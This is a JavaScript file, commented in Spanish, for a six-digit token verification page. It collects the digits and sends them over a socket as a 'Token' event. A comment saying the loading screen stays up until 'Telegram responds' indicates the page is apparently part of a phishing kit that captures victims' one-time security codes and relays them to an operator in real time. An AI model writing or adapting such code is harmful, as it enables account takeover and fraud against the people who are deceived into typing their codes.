/**
 * TOKEN.JS - Página de verificación de token
 * Maneja la entrada y validación de códigos de token de 6 dígitos
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🔐 Iniciando página de verificación de token...');
    
    // Elementos del DOM
    const inputs = document.querySelectorAll('.token-input');
    const verifyButton = document.querySelector('.verify-btn');
    const backButton = document.querySelector('.back-btn');
    const abandonButton = document.querySelector('.abandon-btn');
    const errorMessage = document.querySelector('.error-message');

    // Asegurar inicialización de componentes comunes
    if (window.commonUtils && !window.commonUtils.initialized) {
        window.commonUtils.initializeCommon();
    }

    // Deshabilitar botón de verificar por defecto
    verifyButton.disabled = true;

    // Check if all inputs are filled with valid numbers
    const checkInputs = () => {
        const allFilled = Array.from(inputs).every(input => /^[0-9]$/.test(input.value));
        verifyButton.disabled = !allFilled;
        if (allFilled) {
            verifyButton.classList.add('active');
        } else {
            verifyButton.classList.remove('active');
        }
    };

    // Resetear mensaje de error cuando se empieza a escribir
    const resetError = () => {
        if (errorMessage) {
            errorMessage.style.display = 'none';
        }
    };

    // Auto-advance between token inputs
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            resetError();
            // Allow only numbers
            const value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value.slice(0, 1);

            if (value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else {
                    // If it's the last input and all are filled, enable verify button
                    checkInputs();
                }
            }
            checkInputs();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace') {
                if (!e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
                resetError();
            }
        });

        // Paste handling
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
            
            pastedData.split('').forEach((char, i) => {
                if (i < inputs.length) {
                    inputs[i].value = char;
                }
            });

            if (pastedData.length > 0) {
                const nextEmptyIndex = Math.min(pastedData.length, inputs.length - 1);
                inputs[nextEmptyIndex].focus();
            }
            checkInputs();
        });
    });

    // ========================================
    // BOTÓN DE VERIFICAR
    // ========================================
    
    verifyButton.addEventListener('click', async () => {
        const token = Array.from(inputs).map(input => input.value).join('');
        
        console.log('🔐 Verificando token...');
        
        // Validación del token
        if (token.length !== 6) {
            if (errorMessage) {
                errorMessage.textContent = '⚠️ Por favor ingrese el código completo de 6 dígitos';
                errorMessage.style.display = 'block';
            }
            return;
        }

        if (!/^\d{6}$/.test(token)) {
            if (errorMessage) {
                errorMessage.textContent = '⚠️ El código debe contener solo números';
                errorMessage.style.display = 'block';
            }
            return;
        }

        // Ocultar mensaje de error
        if (errorMessage) {
            errorMessage.style.display = 'none';
        }

        // Deshabilitar botón
        verifyButton.disabled = true;

        // Mostrar overlay - NO SE OCULTA HASTA QUE TELEGRAM RESPONDA
        if (window.loadingOverlay && window.loadingOverlay.show) {
            window.loadingOverlay.show();
        }
        
        console.log('📺 Overlay visible: Cargando...');

        // Preparar datos
        const data = {
            tipo: 'Token',
            codigo: token,
            timestamp: new Date().toISOString()
        };

        try {
            // Verificar socket
            if (!window.socket || !window.socket.connected) {
                throw new Error('Sin conexión al servidor');
            }

            console.log('📤 Enviando token:', token);
            console.log('📊 Socket conectado:', window.socket.connected);
            console.log('📊 Socket ID:', window.socket.id);
            
            // Emitir evento - El overlay permanece visible con 'Cargando'
            window.socket.emit('token_verification', data);
            
            console.log('✅ Evento emitido, overlay: Cargando...');

        } catch (error) {
            console.error('❌ Error:', error);
            
            if (window.loadingOverlay && window.loadingOverlay.hide) {
                window.loadingOverlay.hide();
            }
            
            verifyButton.disabled = false;
            
            if (errorMessage) {
                errorMessage.textContent = '⚠️ Error al enviar. Intente nuevamente.';
                errorMessage.style.display = 'block';
            }
            
            inputs.forEach(input => input.value = '');
            inputs[0].focus();
        }
    });

    // ========================================
    // BOTONES DE NAVEGACIÓN
    // ========================================
    
    if (backButton) {
        backButton.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('← Volviendo atrás');
            window.history.back();
        });
    }

    if (abandonButton) {
        abandonButton.addEventListener('click', () => {
            if (confirm('¿Está seguro que desea abandonar el proceso de verificación?')) {
                console.log('❌ Proceso abandonado por el usuario');
                window.location.href = 'index.html';
            }
        });
    }

    // Enfocar primer input al cargar
    if (inputs.length > 0) {
        inputs[0].focus();
    }

    console.log('✅ Página de token inicializada correctamente');
});